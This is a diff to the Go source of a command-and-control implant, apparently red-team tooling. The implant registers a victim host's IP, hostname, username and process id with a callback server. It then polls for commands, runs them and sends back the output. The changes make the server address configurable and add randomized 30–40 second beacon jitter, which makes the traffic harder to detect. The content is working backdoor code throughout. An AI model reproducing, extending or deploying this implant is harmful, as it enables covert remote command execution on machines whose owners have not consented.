@@ -12,6 +12,7 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -29,13 +30,24 @@ import (
 var registerkey string
 
 // Global Variable Declaration
-var SERVERIP string = "192.168.204.153"
-var PORT string = "443"
+
+var (
+	// SERVERIP is ip addr for callback
+	SERVERIP string
+	// PORT is port for callback
+	PORT string
+)
+
+// FIRSTCONTACTKEY is
 var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
+
+// URL is url for callback
 var URL string = "http://" + SERVERIP + ":" + PORT
 
+// BOTID is
 var BOTID string
 
+// GetOutboundIP is something
 func GetOutboundIP() string {
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
@@ -90,13 +102,13 @@ func firstContact() string {
 	}
 }
 
-func register(registerkey string, ip string, os_name string, user string, pid string) (bool, string) {
+func register(registerkey string, ip string, osName string, user string, pid string) (bool, string) {
 	endpoint := URL + "/register"
 
 	var data = url.Values{
 		"registerkey": {registerkey},
 		"ip":          {ip},
-		"os":          {os_name},
+		"os":          {osName},
 		"user":        {user},
 		"pid":         {pid}}
 
@@ -255,10 +267,25 @@ func executeCommand(command string) string {
 	}
 }
 
+// Returns random integer from min ~ (max-1)
+func randInt(min, max int) int {
+	return min + rand.Intn(max-min)
+}
+
+// Sleep randomly between 30 and 40 seconds - hardcoded for now
+func randSleep(min, max int) time.Duration {
+	rand.Seed(time.Now().UnixNano())
+	interval := time.Duration(randInt(min, max))
+	return interval
+}
+
 func main() {
+	fmt.Println("This is server IP = ", SERVERIP)
+	fmt.Println("This is server PORT = ", PORT)
+
 	ip := GetOutboundIP()
 	user, _ := user.Current()
-	os_name, _ := os.Hostname()
+	osName, _ := os.Hostname()
 	username := user.Username
 	pid := strconv.Itoa(os.Getpid())
 
@@ -271,46 +298,44 @@ func main() {
 				break
 			}
 
-			// implement later
-			//rand.Seed(time.Now().UnixNano())
-			//interval := rand.Intn((50-30+1) + 20)
-			time.Sleep(10 * time.Second)
+			// Sleeps randomly for 30~40 seconds
+			time.Sleep(randSleep(30, 40) * time.Second)
 		}
 	}
 
 	//fmt.Println("[+] Registerkey = ", registerkey)
-	register_result, botid := register(registerkey, ip, os_name, username, pid)
+	registerResult, botid := register(registerkey, ip, osName, username, pid)
 	BOTID = botid
 
-	// Register was not successful. Retry registering for 5 times again
-	if register_result == false {
+	// Register was not successful. Retry registering for 30 times again
+	if registerResult == false {
 		for i := 1; i < 30; i++ {
 			registerkey = firstContact()
-			register_result, botid := register(registerkey, ip, os_name, username, pid)
+			registerResult, botid := register(registerkey, ip, osName, username, pid)
 			BOTID = botid
-			if register_result == true {
+			if registerResult == true {
 				break
 			}
-			time.Sleep(10 * time.Second)
+			time.Sleep(randSleep(30, 40) * time.Second)
 		}
 	}
 
 	// Register was successful
 	for {
-		heartbeat_result := heartbeat(registerkey, ip, pid)
+		heartbeatResult := heartbeat(registerkey, ip, pid)
 
 		// Heartbeat failed. Retry heartbeat for 30 minutes
-		if heartbeat_result == 0 {
+		if heartbeatResult == 0 {
 			for i := 1; i < 180; i++ {
-				heartbeat_result := heartbeat(registerkey, ip, pid)
-				if heartbeat_result == 2 {
+				heartbeatResult := heartbeat(registerkey, ip, pid)
+				if heartbeatResult == 2 {
 					break
 				}
-				time.Sleep(10 * time.Second)
+				time.Sleep(randSleep(30, 40) * time.Second)
 			}
 
 			registerkey = firstContact()
-			_, botid := register(registerkey, ip, os_name, username, pid)
+			_, botid := register(registerkey, ip, osName, username, pid)
 			BOTID = botid
 		}
 
@@ -318,7 +343,7 @@ func main() {
 		command := fetchCommand(registerkey, BOTID)
 
 		if strings.Contains(command, "[-]") == true {
-			time.Sleep(10 * time.Second)
+			time.Sleep(randSleep(30, 40) * time.Second)
 			continue
 		}
 
@@ -326,7 +351,7 @@ func main() {
 		//fmt.Println("[DEBUG] result = ", execute_result)
 		submitResult(registerkey, BOTID, execute_result)
 
-		time.Sleep(10 * time.Second)
+		time.Sleep(randSleep(30, 40) * time.Second)
 
 	}
 
